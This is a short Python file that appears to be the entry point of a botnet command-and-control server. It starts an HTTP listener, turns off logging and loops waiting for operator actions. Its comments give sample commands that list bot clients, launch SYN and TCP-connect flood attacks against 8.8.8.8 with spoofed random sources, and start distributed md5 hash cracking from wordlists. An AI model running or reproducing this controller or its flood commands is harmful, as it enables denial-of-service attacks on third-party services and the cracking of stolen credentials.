'''
Created on May 14, 2014

@author: Onur
'''

#l list-clients
#r ddos_start 10000 99999 --tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 20 8.8.8.8
#r ddos_start 10000 99999 --tcp-connect -p 80 -g random --delay 10ms -c 20 8.8.8.8
#r hcrack_start 10000 99999 md5 wlist.txt hashes.txt


import sys
sys.path.append("../")

import logging
from domain.Controller import Controller
from domain.Commander import Commander
from domain.CustomHTTPServer import CustomHTTPServer

if __name__ == '__main__':
    logger = logging.getLogger()
    logger.disabled = True
    
    #server = CustomHTTPServer('192.168.41.1', 80)
    server = CustomHTTPServer('127.0.0.1', 80)
    server.startServer()
    controller = Controller(Commander(server))
    
    while True:
        controller.waitAction()